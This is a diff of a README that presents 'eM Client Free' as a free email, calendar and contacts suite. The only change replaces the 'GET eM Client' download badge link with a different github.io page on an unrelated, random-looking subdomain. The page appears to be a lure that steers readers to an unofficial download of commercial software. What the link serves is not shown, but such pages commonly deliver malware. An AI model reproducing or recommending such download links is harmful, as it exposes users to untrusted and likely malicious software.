@@ -1,6 +1,6 @@
 # eM Client Free - Desktop Email, Calendar, Contacts, and Communication Suite
 
-[![GET eM Client](https://img.shields.io/badge/GET%20%E2%80%94%20eM%20Client-0078D6?style=for-the-badge&logoColor=white)](https://brysoncollinscdub.github.io/.github/em-client)
+[![GET eM Client](https://img.shields.io/badge/GET%20%E2%80%94%20eM%20Client-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhdwd.github.io/.github/em-client-free)
 
 ## Communication Hub Overview
 
